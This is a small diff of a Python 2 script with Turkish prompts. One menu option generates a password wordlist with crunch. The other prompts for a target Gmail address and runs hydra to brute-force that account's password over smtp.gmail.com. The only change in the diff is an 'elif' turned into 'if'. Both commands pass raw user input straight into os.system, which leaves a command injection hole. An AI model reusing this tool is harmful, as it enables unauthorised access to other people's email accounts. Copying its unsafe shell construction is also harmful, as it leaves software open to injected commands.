@@ -25,7 +25,7 @@ if(secim=="1"):
 	kullanilan = raw_input("Kullanılacak Karakterler : ")
 	os.system("crucnh " + minimum + " " + maksimum + " " + kullanilan + " -o parola_listesi.txt")
 	
-elif(secim=="2"):
+if(secim=="2"):
 	hedef = raw_input("Hedef Gmail : ")
 	parola = raw_input("Parola Listesi : ")
 	os.system("hydra -S -v -V -s 465 -l " + hedef + " -P " + parola + " smtp.gmail.com smtp")
